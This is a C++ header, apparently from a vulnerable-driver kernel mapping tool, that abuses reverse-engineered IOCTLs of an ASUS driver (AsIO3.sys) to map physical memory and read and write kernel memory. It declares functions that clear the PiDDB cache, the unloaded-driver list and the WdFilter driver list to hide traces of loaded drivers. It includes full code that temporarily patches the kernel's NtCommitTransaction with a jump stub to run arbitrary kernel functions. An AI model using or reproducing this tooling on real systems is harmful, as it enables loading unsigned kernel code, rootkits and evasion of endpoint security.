#pragma once
#include <Windows.h>
#include <string>
#include <iostream>

#include "utils.hpp"
#include "nt.hpp"

namespace asusgio3_driver
{
	// Device name
	constexpr const wchar_t* DEVICE_NAME = L"\\\\.\\Asusgio3";

	// IOCTLs from Ghidra RE of AsIO3.sys
	constexpr ULONG32 IOCTL_MAP_PHYS = 0xa040a480;   // Map physical memory (40 bytes input)
	constexpr ULONG32 IOCTL_UNMAP_PHYS = 0xa0402450; // Unmap physical memory

	// Structure for MAP: 40 bytes (0x28)
	#pragma pack(push, 1)
	struct MAP_PHYS_REQUEST {
		uint64_t PhysicalAddress;  // Offset 0 - input: physical address to map
		uint64_t Size;            // Offset 8 - input: size to map
		uint64_t VirtualAddress;  // Offset 16 - output: mapped virtual address
		uint64_t SectionHandle;   // Offset 24 - output: section handle
		uint64_t ObjectReference; // Offset 32 - output: object reference
	};
	#pragma pack(pop)

	extern HANDLE hDevice;
	extern ULONG64 ntoskrnlAddr;
	extern ULONG64 physToVirtOffset;
	extern bool offsetInitialized;

	// Driver interface
	bool IsRunning();
	bool OpenDevice();
	void CloseDevice();

	// Physical memory mapping
	uint64_t MapPhysicalMemory(uint64_t phys_addr, uint64_t size);
	bool UnmapPhysicalMemory(uint64_t virtual_addr, uint64_t section_handle, uint64_t object_ref);

	// Physical memory operations (using mapped memory)
	bool ReadPhysicalMemory(uint64_t phys_addr, void* buffer, size_t size);
	bool WritePhysicalMemory(uint64_t phys_addr, void* buffer, size_t size);

	// Virtual to physical translation (scans for ntoskrnl once)
	bool InitializePhysicalOffset();
	bool GetPhysicalAddress(uint64_t virt_addr, uint64_t* out_phys_addr);

	// Kernel virtual memory operations (translate then read/write physical)
	bool ReadKernelMemory(uint64_t address, void* buffer, size_t size);
	bool WriteKernelMemory(uint64_t address, void* buffer, size_t size);
	
	// Compatibility aliases
	inline bool ReadMemory(uint64_t addr, void* buf, uint64_t size) { return ReadKernelMemory(addr, buf, size); }
	inline bool WriteMemory(uint64_t addr, void* buf, uint64_t size) { return WriteKernelMemory(addr, buf, size); }
	inline bool WriteToReadOnlyMemory(uint64_t addr, void* buf, uint32_t size) { return WriteKernelMemory(addr, buf, size); }

	// Memory utilities
	bool MemCopy(uint64_t dest, uint64_t src, uint64_t size);
	bool SetMemory(uint64_t address, uint32_t value, uint64_t size);

	// Kernel module functions
	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);

	// Memory allocation (via kernel function calls)
	uint64_t AllocatePool(nt::POOL_TYPE pool_type, uint64_t size);
	bool FreePool(uint64_t address);
	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
	bool MmFreeIndependentPages(uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect);

	// Pattern finding
	uintptr_t FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);
	PVOID ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);

	// Kernel function helpers
	bool ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer);
	nt::PiDDBCacheEntry* LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);

	// Cleanup stubs
	bool ClearPiDDBCacheTable();
	bool ClearKernelHashBucketList();
	bool ClearMmUnloadedDrivers();
	bool ClearWdFilterDriverList();

	// Kernel function calling - patches NtCommitTransaction temporarily
	template<typename T, typename ...A>
	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		// Get usermode NtCommitTransaction
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (!ntdll)
			return false;

		const auto NtCommitTransaction = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtCommitTransaction"));
		if (!NtCommitTransaction)
			return false;

		// Get kernel NtCommitTransaction address
		static uint64_t kernel_NtCommitTransaction = 0;
		if (!kernel_NtCommitTransaction) {
			kernel_NtCommitTransaction = GetKernelModuleExport(ntoskrnlAddr, "NtCommitTransaction");
			if (!kernel_NtCommitTransaction)
				return false;
		}

		// Create jump stub: mov rax, addr; jmp rax
		uint8_t jmp_stub[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_bytes[sizeof(jmp_stub)];
		*(uint64_t*)&jmp_stub[2] = kernel_function_address;

		// Read original bytes
		if (!ReadKernelMemory(kernel_NtCommitTransaction, original_bytes, sizeof(original_bytes)))
			return false;

		// Check if already patched
		if (original_bytes[0] == 0x48 && original_bytes[1] == 0xb8)
			return false;

		// Patch kernel function
		if (!WriteKernelMemory(kernel_NtCommitTransaction, jmp_stub, sizeof(jmp_stub)))
			return false;

		// Call the function via syscall
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtCommitTransaction);
			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtCommitTransaction);
			Function(arguments...);
		}

		// Restore original bytes
		return WriteKernelMemory(kernel_NtCommitTransaction, original_bytes, sizeof(jmp_stub));
	}
}
